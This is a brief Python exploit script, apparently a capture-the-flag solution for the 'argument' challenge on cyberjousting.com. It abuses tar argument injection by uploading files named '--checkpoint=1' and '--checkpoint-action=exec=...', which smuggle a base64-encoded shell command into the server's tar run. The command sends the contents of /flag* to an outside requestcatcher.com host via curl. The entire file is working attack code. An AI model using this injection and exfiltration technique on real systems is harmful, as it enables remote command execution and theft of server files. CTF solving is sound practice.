import requests, base64


# initializations
URL = "http://argument.chal.cyberjousting.com"
session = requests.Session()
cmd = b"curl https://asdfsafasdfs.requestcatcher.com/$(cat /flag*)"


# get session cookie
session.request("GET", URL)


# upload random file
files = {"file": ("asdfasdf", "doesn't matter")}
resp = session.request("POST", f"{URL}/api/upload", files=files)


# upload command
files = {"file": ("--checkpoint=1", "doesn't matter")}
resp = session.request("POST", f"{URL}/api/upload", files=files)

files = {"file": (f"--checkpoint-action=exec=echo '{base64.b64encode(cmd).decode()}' | base64 -d | bash", "doesn't matter")}
resp = session.request("POST", f"{URL}/api/upload", files=files)


# download flag
resp = session.request("GET", f"{URL}/api/download")